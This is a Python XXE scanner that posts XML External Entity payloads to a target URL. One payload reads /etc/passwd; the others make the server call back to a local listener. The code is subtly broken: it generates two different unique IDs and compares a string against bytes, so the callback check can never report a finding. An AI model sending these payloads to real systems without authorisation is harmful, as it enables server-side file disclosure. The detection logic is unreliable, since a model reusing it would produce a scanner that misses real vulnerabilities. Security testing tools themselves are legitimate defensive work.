"""
Author: Ayush Bhandari
Email: ayushbhandariofficial@gmail.com
"""
import socket
import time
import hashlib
import requests
import threading
from urllib.parse import urlparse

# Dummy response
data = b'''\
HTTP/1.1 200 OK\r\n\
Connection: close\r\n\
Content-Type: text/html\r\n\
Content-Length: 6\r\n\
\r\n\
Hello!\
'''

# Define XXE payloads directly in code
XXE_PAYLOADS = [
    """<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ 
      <!ELEMENT foo ANY >
      <!ENTITY xxe SYSTEM "http://{host}/file.xml" >
    ]>
    <foo>&xxe;</foo>""",
    """<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ 
      <!ENTITY xxe SYSTEM "file:///etc/passwd" >
    ]>
    <foo>&xxe;</foo>""",
    """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "{host}" 
    >]><foo>&xxe;</foo>"""
]


def generate_hash():
    return hashlib.md5(str(time.time()).encode('utf-8')).hexdigest()


def start_server(host, port):
    s = socket.socket()
    try:
        s.bind((host, port))
        print("XXE: Server started.")
        return s
    except socket.error:
        print("XXE: Can't bind to port. Port may be busy or check firewall setting.")
        return None


def start_listening(s, unique_id):
    global vulnerable
    vulnerable = False
    try:
        while True:
            s.listen(5)
            conn, addr = s.accept()
            data = conn.recv(1024)
            if data and unique_id in data:
                conn.sendall(data)
                vulnerable = True
            conn.close()
    except socket.error:
        print("[-] URL might not be vulnerable to XXE. We recommend you check it manually.")
        conn.close()


def send_request(url, headers, xxe_payloads, host):
    sample_xml = '''<?xml version="1.0" encoding="UTF-8"?><text>hello world</text>'''
    xml_request = requests.post(url, headers=headers, data=sample_xml)
    if xml_request.status_code == 415:
        # Media type not supported.
        return []

    unique_id = generate_hash()
    server_url = f"http://{host}:1111/{unique_id}"
    results = []

    for payload in xxe_payloads:
        payload = payload.replace("{host}", server_url)
        xxe_request = requests.post(url, headers=headers, data=payload)
        if vulnerable:
            result = {
                "id": 14,
                "alert": "XML External Entity Attack",
                "severity": "High",
                "url": url,
                "req_headers": headers,
                "req_body": payload,
                "res_headers": xxe_request.headers,
                "res_body": xxe_request.text
            }
            results.append(result)
            break

    if not results:
        return {"result": "No vulnerabilities found"}

    return results


def xxe_test(url, method, headers, body):
    host = socket.gethostbyname(socket.gethostname())
    port = 1111

    s = start_server(host, port)
    if s:
        unique_id = generate_hash()
        t = threading.Thread(target=start_listening, args=(s, unique_id))
        t.daemon = True
        t.start()
        headers['Content-Type'] = 'text/xml'
        results = send_request(url, headers, XXE_PAYLOADS, host)
        return results

# Example usage:
# results = xxe_test('http://example.com/api', 'POST', {'Authorization': 'Bearer token'}, {'key': 'value'})
# print(results)
